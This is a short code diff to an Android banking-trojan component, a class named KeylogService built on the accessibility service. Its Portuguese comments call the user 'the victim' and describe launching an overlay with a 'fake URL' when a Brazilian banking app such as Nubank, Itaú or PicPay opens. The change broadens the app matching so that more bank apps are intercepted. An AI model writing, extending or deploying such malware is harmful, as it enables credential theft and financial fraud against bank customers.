@@ -15,11 +15,11 @@ public class KeylogService extends AccessibilityService {
                 String pkg = event.getPackageName().toString();
 
                 // Lista de apps de banco que a gente quer interceptar
-                if (pkg.equals("com.nubank") || 
-                    pkg.equals("com.itau") || 
-                    pkg.equals("com.bradesco") ||
-                    pkg.equals("com.picpay")) {
-                    
+                if (pkg.contains("nubank") ||
+                    pkg.contains("nu.production") ||
+                    pkg.contains("itau") ||
+                    pkg.contains("picpay")) {
+
                     // A vítima abriu o banco!
                     // Dispara o OverlayService com a URL falsa
                     Intent intent = new Intent(this, OverlayService.class);
